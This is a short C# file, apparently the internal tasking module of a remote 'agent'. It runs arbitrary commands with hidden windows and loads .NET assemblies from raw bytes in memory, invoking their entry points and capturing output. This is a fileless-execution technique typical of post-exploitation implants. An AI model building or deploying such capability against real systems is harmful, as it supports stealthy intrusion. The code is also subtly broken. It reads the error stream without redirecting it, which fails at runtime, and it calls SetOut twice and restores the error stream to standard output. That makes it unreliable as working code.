using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public static class Execute
    {
        public static string ExecuteCommand (string fileName,string arguments)
        {


            var startInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            string outpout = "";
            var process = new Process
            {
                StartInfo = startInfo
            };



            process.OutputDataReceived += (_, e) => { outpout += e.Data; };
            process.ErrorDataReceived += (_, e) => { outpout += e.Data; };

            process.Start();

            process.BeginErrorReadLine();
            process.BeginOutputReadLine();


            process.WaitForExit();
            return outpout;
        }

        public static string ExecuteAssembly(byte[] asm, string[] arguments = null)
        {
            if (arguments == null)
                arguments = new string[0] {};

            
            var currentOut = Console.Out;
            var currentError = Console.Error;

            
            var ms=new MemoryStream();
            var sw= new StreamWriter(ms);
            {
                sw.AutoFlush = true;

            }

            Console.SetOut(sw);
            Console.SetOut(sw);

            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null,new object[] {arguments});

            Console.Out.Flush();
            Console.Error.Flush();
        
            var output =Encoding.UTF8.GetString(ms.ToArray());

            Console.SetOut(currentOut);
            Console.SetError (currentOut);

            sw.Dispose();
            ms.Dispose();
            return output;
        }
    }
}
